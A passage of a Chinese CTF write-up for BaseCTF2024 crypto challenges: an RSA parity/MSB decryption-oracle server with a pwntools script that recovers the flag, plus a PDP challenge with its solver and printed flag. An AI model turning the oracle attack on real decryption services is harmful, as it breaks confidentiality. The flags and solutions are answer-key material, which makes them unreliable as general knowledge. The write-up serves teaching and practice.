class="hljs-literal">True</span>:<br>            part = <span class="hljs-variable language_">self</span>.request.recv(BUFF_SIZE)<br>            data += part<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(part) &lt; BUFF_SIZE:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">return</span> data.strip()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, msg, newline=<span class="hljs-literal">True</span></span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> newline:<br>                msg += <span class="hljs-string">b&#x27;\n&#x27;</span><br>            <span class="hljs-variable language_">self</span>.request.sendall(msg)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">recv</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>._recvall()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self</span>):<br>        <br>        p=getPrime(<span class="hljs-number">256</span>)<br>        q=getPrime(<span class="hljs-number">256</span>)<br>        n=p*q<br>        e=<span class="hljs-number">65537</span><br>        d=inverse(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><br>        text=<span class="hljs-string">b&#x27;BaseCTF&#123;&#x27;</span>+<span class="hljs-built_in">str</span>(uuid.uuid4()).encode()+<span class="hljs-string">b&#x27;&#125;&#x27;</span><br><br>        m1=bytes_to_long(text[:<span class="hljs-built_in">len</span>(text)//<span class="hljs-number">2</span>])<br>        c1=<span class="hljs-built_in">pow</span>(m1,e,n)<br><br>        m2=bytes_to_long(text[<span class="hljs-built_in">len</span>(text)//<span class="hljs-number">2</span>:])<br>        c2=<span class="hljs-built_in">pow</span>(m2,e,n)<br><br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;n = &#x27;</span>+<span class="hljs-built_in">str</span>(n).encode())<br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;e = &#x27;</span>+<span class="hljs-built_in">str</span>(e).encode())<br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;c1 = &#x27;</span>+<span class="hljs-built_in">str</span>(c1).encode())<br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;c2 = &#x27;</span>+<span class="hljs-built_in">str</span>(c2).encode())<br><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            select=<span class="hljs-variable language_">self</span>.recv().strip()<br>            <span class="hljs-keyword">if</span> select==<span class="hljs-string">b&#x27;1&#x27;</span>:<br>                c=<span class="hljs-built_in">int</span>(<span class="hljs-variable language_">self</span>.recv().decode().strip())<br>                m=<span class="hljs-built_in">pow</span>(c,d,n)<br>                res=m&amp;<span class="hljs-number">1</span><br>            <span class="hljs-keyword">elif</span> select==<span class="hljs-string">b&#x27;2&#x27;</span>:<br>                c=<span class="hljs-built_in">int</span>(<span class="hljs-variable language_">self</span>.recv().decode().strip())<br>                m=<span class="hljs-built_in">pow</span>(c,d,n)<br>                res=long_to_bytes(m,<span class="hljs-number">64</span>)[<span class="hljs-number">0</span>]<br>            <span class="hljs-keyword">elif</span> select==<span class="hljs-string">b&#x27;3&#x27;</span>:<br>                user_text=<span class="hljs-variable language_">self</span>.recv().strip()<br>                <span class="hljs-keyword">if</span> user_text==text:<br>                    <span class="hljs-variable language_">self</span>.send(flag)<br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;try again&#x27;</span>)<br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span> :<br>                <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&#x27;wrong&#x27;</span>)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-built_in">str</span>(res).encode())<br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;\nConnection has been closed  =.=  &quot;</span>)<br>        <span class="hljs-variable language_">self</span>.request.close()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadedServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ForkedServer</span>(socketserver.ForkingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    HOST, PORT = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">9999</span><br>    server = ForkedServer((HOST, PORT), Task)<br>    server.allow_reuse_address = <span class="hljs-literal">True</span><br>    server.serve_forever()<br><br></code></pre></td></tr></table></figure><p>参考了La佬的博客：<a href="https://lazzzaro.github.io/2020/05/06/crypto-RSA/">RSA | Lazzaro (lazzzaro.github.io)</a></p><p>说明一下出题：没点子了，就逛ctfwiki上看到了这个，然后搜了一圈只找到了LSB的代码，MSB没有，我就顺便结合起来了，然后由于GZ这里每个队伍开不同容器flag还是一样的，为了防止多次加密不安全，所以套了一下，先道个歉。</p><p>原理我就不献丑了，可以去看看佬们的博客。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> decimal<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> *<br>rem=remote()<br>rem.recvuntil(<span class="hljs-string">b&#x27;n = &#x27;</span>)<br>n=<span class="hljs-built_in">int</span>(rem.recvline().decode().strip())<br><br>rem.recvuntil(<span class="hljs-string">b&#x27;e = &#x27;</span>)<br>e=<span class="hljs-built_in">int</span>(rem.recvline().decode().strip())<br><br>rem.recvuntil(<span class="hljs-string">b&#x27;c1 = &#x27;</span>)<br>c1=<span class="hljs-built_in">int</span>(rem.recvline().decode().strip())<br><br>rem.recvuntil(<span class="hljs-string">b&#x27;c2 = &#x27;</span>)<br>c2=<span class="hljs-built_in">int</span>(rem.recvline().decode().strip())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">server_decode1</span>(<span class="hljs-params">c</span>):<br>    rem.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sleep(<span class="hljs-number">0.01</span>)<br>    rem.sendline(<span class="hljs-built_in">str</span>(c).encode())<br>    rec=rem.recvline().strip()<br>    <span class="hljs-keyword">return</span> rec<br>kbits = n.bit_length()<br>decimal.getcontext().prec = kbits<br>L = decimal.Decimal(<span class="hljs-number">0</span>)<br>R = decimal.Decimal(<span class="hljs-built_in">int</span>(n))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(kbits):<br>    c1 = (c1 * <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, e, n)) % n<br>    recv = server_decode1(c1)<br>    <span class="hljs-keyword">if</span> recv == <span class="hljs-string">b&#x27;1&#x27;</span>:<br>        L = (L + R) // <span class="hljs-number">2</span><br>    <span class="hljs-keyword">else</span>:<br>        R = (L + R) // <span class="hljs-number">2</span><br>flag1=long_to_bytes(<span class="hljs-built_in">int</span>((R)))<br><span class="hljs-built_in">print</span>(flag1)<br>sleep(<span class="hljs-number">0.01</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">server_decode2</span>(<span class="hljs-params">c</span>):<br>    rem.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sleep(<span class="hljs-number">0.01</span>)<br>    rem.sendline(<span class="hljs-built_in">str</span>(c).encode())<br>    rec=rem.recvline().strip()<br>    <span class="hljs-keyword">return</span> rec<br>k=<span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    c22 = (c2 * <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, e*k, n)) % n<br>    res=server_decode2(c22)<br>    res=<span class="hljs-built_in">int</span>(res)<br>    <span class="hljs-keyword">if</span> res&amp;<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">break</span><br>    k=k+<span class="hljs-number">1</span><br>L=<span class="hljs-number">2</span>**(k-<span class="hljs-number">1</span>)<br>R=<span class="hljs-number">2</span>**k<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">if</span> R-L==<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">break</span><br>    x=(L+R)//<span class="hljs-number">2</span><br>    c22 = (c2 * <span class="hljs-built_in">pow</span>(x, e, n)) % n<br>    res=server_decode2(c22)<br>    res=<span class="hljs-built_in">int</span>(res)<br>    <span class="hljs-keyword">if</span> res:<br>        R=x<br>    <span class="hljs-keyword">else</span> :<br>        L=x<br>flag2=(<span class="hljs-number">2</span>**(kbits-<span class="hljs-number">8</span>)//L)<br><span class="hljs-built_in">print</span>(long_to_bytes(flag2))<br>user_text=flag1[:-<span class="hljs-number">1</span>]+<span class="hljs-string">b&#x27;-&#x27;</span>+long_to_bytes(flag2)<br><span class="hljs-built_in">print</span>(user_text)<br>rem.sendline(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>sleep(<span class="hljs-number">0.01</span>)<br>rem.sendline(user_text)<br><br><br>rem.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="pdp"><a class="markdownIt-Anchor" href="#pdp"></a> PDP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> hmac<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">KeyGen</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        pp=getPrime(<span class="hljs-number">512</span>)<br>        p=<span class="hljs-number">2</span>*pp+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> isPrime(p):<br>            pp=getPrime(<span class="hljs-number">512</span>)<br>            p=<span class="hljs-number">2</span>*pp+<span class="hljs-number">1</span><br><br>        qq=getPrime(<span class="hljs-number">512</span>)<br>        q=<span class="hljs-number">2</span>*qq+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> isPrime(q):<br>            qq=getPrime(<span class="hljs-number">512</span>)<br>            q=<span class="hljs-number">2</span>*qq+<span class="hljs-number">1</span><br>        <br>        <span class="hljs-keyword">if</span> pp!=qq:<br>            <span class="hljs-keyword">break</span><br>    n=p*q<br>    phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><br>    e=getPrime(<span class="hljs-number">1024</span>)<br>    d=invert(e,phi)<br><br>    v=getRandomNBitInteger(<span class="hljs-number">128</span>)<br><br>    g=e**<span class="hljs-number">2</span>%n<br><br>    <span class="hljs-keyword">return</span> (n,g,e,d,v)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">TagBlock</span>(<span class="hljs-params">n,g,d,v</span>):<br>    f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;ABigFile&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>    F=f.read()<br>    f.close()<br>    b_size=<span class="hljs-number">64</span>   <span class="hljs-comment"># 64B</span><br><br>    block_count=<span class="hljs-built_in">len</span>(F)//b_size + (<span class="hljs-number">0</span> <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(F)%b_size==<span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-number">1</span>)<br><br>    W=[]<br>    tags=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(block_count):<br>        Wi=<span class="hljs-built_in">str</span>(v)+<span class="hljs-built_in">str</span>(i)<br>        W.append(Wi)<br><br>        block=bytes_to_long(F[i*b_size:(i+<span class="hljs-number">1</span>)*b_size])<br><br>        my_md5=hashlib.md5()<br>        my_md5.update(Wi.encode())<br>        tags.append(<span class="hljs-built_in">pow</span>((<span class="hljs-built_in">int</span>(my_md5.hexdigest(),<span class="hljs-number">16</span>)*<span class="hljs-built_in">pow</span>(g,block,n))%n,d,n))<br>    <span class="hljs-keyword">return</span> (W,tags)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">GenProof</span>(<span class="hljs-params">n,g</span>):<br>    c=randint(<span class="hljs-number">400</span>,<span class="hljs-number">500</span>)<br>    k1=getRandomNBitInteger(<span class="hljs-number">256</span>)<br>    k2=getRandomNBitInteger(<span class="hljs-number">160</span>)<br>    s=getRandomNBitInteger(<span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">return</span> (c,k1,k2,s,<span class="hljs-built_in">pow</span>(g,s,n))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_proof</span>(<span class="hljs-params">n,tags,c,k1,k2,gs,judge=<span class="hljs-number">0</span></span>):<br>    f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;ABigFile&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>    F=f.read()<br>    f.close()<br>    b_size=<span class="hljs-number">64</span>   <span class="hljs-comment"># 64B</span><br><br>    <span class="hljs-keyword">if</span> judge:<br>        listF=<span class="hljs-built_in">list</span>(F)<br>        X=[]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(F)//<span class="hljs-number">100</span>):<br>            x=randint(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(F)-<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">while</span> listF[x]==<span class="hljs-number">0</span>:<br>                x=randint(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(F)-<span class="hljs-number">1</span>)<br>            X.append(x)<br>            listF[x]=<span class="hljs-number">0</span><br>        F=<span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> listF:<br>            F+=long_to_bytes(i)<br><br>    block_count=<span class="hljs-built_in">len</span>(F)//b_size + (<span class="hljs-number">0</span> <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(F)%b_size==<span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-number">1</span>)<br>    T=<span class="hljs-number">1</span><br>    temp=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(c):<br>        my_aes=AES.new(long_to_bytes(k1),mode=AES.MODE_ECB)<br>        i=my_aes.encrypt(pad(long_to_bytes(j),AES.block_size))<br>        i=bytes_to_long(i)%block_count<br><br>        my_sha256=hashlib.sha256<br>        my_hmac=hmac.new(long_to_bytes(k2),digestmod=my_sha256)<br>        my_hmac.update(long_to_bytes(j))<br>        a=<span class="hljs-built_in">int</span>(my_hmac.hexdigest(),<span class="hljs-number">16</span>)%n<br><br>        T=(T*(<span class="hljs-built_in">pow</span>(tags[i],a,n)))%n<br><br>        block=bytes_to_long(F[i*b_size:(i+<span class="hljs-number">1</span>)*b_size])%n<br><br>        temp=temp+block*a<br>    temp=<span class="hljs-built_in">pow</span>(gs,temp,n)<br>    my_sha1=hashlib.sha1()<br>    my_sha1.update(<span class="hljs-built_in">str</span>(temp).encode())<br>    rho=<span class="hljs-built_in">int</span>(my_sha1.hexdigest(),<span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">return</span> (T,rho)<br><br>n,g,e,d,v=KeyGen()<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./output/key.txt&quot;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(<span class="hljs-built_in">str</span>(n)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    file.write(<span class="hljs-built_in">str</span>(e)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>W,tags=TagBlock(n,g,d,v)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./output/W.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> W:<br>        file.write(<span class="hljs-built_in">str</span>(i))<br>        file.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>c,k1,k2,s,gs=GenProof(n,g)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./output/chal.txt&quot;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(<span class="hljs-built_in">str</span>(c)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    file.write(<span class="hljs-built_in">str</span>(k1)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    file.write(<span class="hljs-built_in">str</span>(k2)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    file.write(<span class="hljs-built_in">str</span>(s)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>T,rho=gen_proof(n,tags,c,k1,k2,gs)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./output/result.txt&quot;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        file.write(<span class="hljs-built_in">str</span>(T)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>flag_md5=hashlib.md5()<br>flag_md5.update(<span class="hljs-built_in">str</span>(rho).encode())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;BaseCTF&#123;&#x27;</span>+flag_md5.hexdigest().encode()+<span class="hljs-string">b&#x27;&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>我的毕设课题，正好感觉能出成一题就出了，具体不多说，详了解的可以看：<a href="https://github.com/naby1/S-PDP">naby1/S-PDP (github.com)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> hmac<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">CheckProff</span>(<span class="hljs-params">n,e,W,c,k1,k2,s,T</span>):<br>    tau=<span class="hljs-built_in">pow</span>(T,e,n)<br>    block_count=<span class="hljs-built_in">len</span>(W)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(c):<br>        my_aes=AES.new(long_to_bytes(k1),mode=AES.MODE_ECB)<br>        i=my_aes.encrypt(pad(long_to_bytes(j),AES.block_size))<br>        i=bytes_to_long(i)%block_count<br><br>        my_sha256=hashlib.sha256<br>        my_hmac=hmac.new(long_to_bytes(k2),digestmod=my_sha256)<br>        my_hmac.update(long_to_bytes(j))<br>        a=<span class="hljs-built_in">int</span>(my_hmac.hexdigest(),<span class="hljs-number">16</span>)%n<br><br>        Wi=<span class="hljs-built_in">str</span>(W[i])<br>        my_md5=hashlib.md5()<br>        my_md5.update(Wi.encode())<br>        hw=<span class="hljs-built_in">pow</span>(<span class="hljs-built_in">int</span>(my_md5.hexdigest(),<span class="hljs-number">16</span>),a,n)<br>        tau=(tau*invert(hw,n))%n<br>    tau=<span class="hljs-built_in">pow</span>(tau,s,n)<br>    my_sha1=hashlib.sha1()<br>    my_sha1.update(<span class="hljs-built_in">str</span>(tau).encode())<br>    tau=<span class="hljs-built_in">int</span>(my_sha1.hexdigest(),<span class="hljs-number">16</span>)<br>    flag_md5=hashlib.md5()<br>    flag_md5.update(<span class="hljs-built_in">str</span>(tau).encode())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;BaseCTF&#123;&#x27;</span>+flag_md5.hexdigest().encode()+<span class="hljs-string">b&#x27;&#125;&#x27;</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./output/key.txt&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    n=<span class="hljs-built_in">int</span>(file.readline())<br>    e=<span class="hljs-built_in">int</span>(file.readline())<br><br>W=[]<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./output/W.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    fl=file.readline()<br>    <span class="hljs-keyword">while</span> fl:<br>        W.append(<span class="hljs-built_in">int</span>(fl))<br>        fl=file.readline()<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./output/chal.txt&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    c=<span class="hljs-built_in">int</span>(file.readline())<br>    k1=<span class="hljs-built_in">int</span>(file.readline())<br>    k2=<span class="hljs-built_in">int</span>(file.readline())<br>    s=<span class="hljs-built_in">int</span>(file.readline())<br>T=<span class="hljs-number">234286400251524464112670458144913694525518333434039777508421611102466502545441606446799021254782625175811569624228349681696143431027926557585053651139957429856785510525021542033961575674601192776283321921860155347475439442726331189839563865687519551977156169783131926796425661730777079164446161030078497564104</span><br>CheckProff(n,e,W,c,k1,k2,s,T)<br><br><span class="hljs-comment">#BaseCTF&#123;d198bce7a2f06ed24d3b043bddbd7512&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Crypto</tag>
      
      <tag>BaseCTF2024</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
